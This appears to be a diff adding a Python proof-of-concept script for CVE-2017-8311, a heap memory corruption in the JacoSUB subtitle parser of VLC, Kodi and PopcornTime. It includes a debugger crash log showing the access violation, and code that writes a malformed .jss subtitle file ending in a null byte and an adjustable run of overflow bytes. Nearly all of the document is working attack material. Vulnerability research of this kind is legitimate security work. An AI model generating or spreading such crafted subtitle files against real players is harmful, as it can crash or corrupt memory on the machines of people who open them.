@@ -1,0 +1,62 @@
+"""
+VLC Media Player/Kodi/PopcornTime 'Red Chimera' < 2.2.5 Memory Corruption (PoC)
+Author: SivertPL (kroppoloe@protonmail.ch)
+CVE: CVE-2017-8311
+
+Infamous VLC/Kodi/PopcornTime subtitle attack in libsubtitle_plugin.dll.
+This is the Proof of Concept of the reverse engineered heap corruption vulnerability affecting JacoSUB parsing in VLC/Kodi/PopcornTime.
+The crash is exploitable, but hard to exploit because of various environmental constraints such as threading/mitigations/scriptless.
+I want to join a research team.
+"""
+
+"""
+ModLoad: 00000000`71660000 00000000`716a2000   C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libmp4_plugin.dll
+ModLoad: 00000000`71630000 00000000`71651000   C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libavi_plugin.dll
+ModLoad: 00000000`71610000 00000000`7162e000   C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libasf_plugin.dll
+ModLoad: 00000000`71600000 00000000`7160d000   C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libdemux_cdg_plugin.dll
+ModLoad: 00000000`715e0000 00000000`715fd000   C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libvobsub_plugin.dll
+ModLoad: 00000000`715d0000 00000000`715de000   C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libdemux_stl_plugin.dll
+ModLoad: 00000000`715b0000 00000000`715cf000   C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libsubtitle_plugin.dll
+core demux error: option sub-original-fps does not exist
+(33c.d10): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files (x86)\VideoLAN\VLC\plugins\demux\libsubtitle_plugin.dll -
+libsubtitle_plugin+0x44de:
+715b44de 881f            mov     byte ptr [edi],bl          ds:002b:1b9fb000=??
+0:012:x86> g
+(33c.d10): Access violation - code c0000005 (!!! second chance !!!)
+wow64!Wow64NotifyDebugger+0x1d:
+00000000`754ac9f1 654c8b1c2530000000 mov   r11,qword ptr gs:[30h] gs:00000000`00000030=????????????????
+"""
+
+import os
+import struct
+import sys
+import argparse
+
+len = 1025
+
+def main(argv):
+    parser = argparse.ArgumentParser()
+    parser.add_argument("filename", help="Name of the movie file w/o extension, for generating payload")
+    parser.add_argument("--length", help="Heap overwrite length (default 1025, may be bigger)", type=int)
+    args = parser.parse_args()
+    if args.length:
+        global len
+        len = args.length
+    print "[+] Generating file %s.jss with overwrite size of %d" % (args.filename, len)
+    write(args.filename, len)
+
+def write(name, len):
+    subtitles = open("%s.jss" % name, "w+")
+    subtitles.write("0:00:02.00 0:00:04.00 VL red chimera..\n")
+    subtitles.write("0:00:04.00 0:00:05.00 vm attack")
+    subtitles.write("\\C")
+    subtitles.write(struct.pack('B', 0))
+    subtitles.write('A' * len)
+    subtitles.close()
+    print "[+] Done!"
+
+if __name__ == "__main__":
+     main(sys.argv[1:])
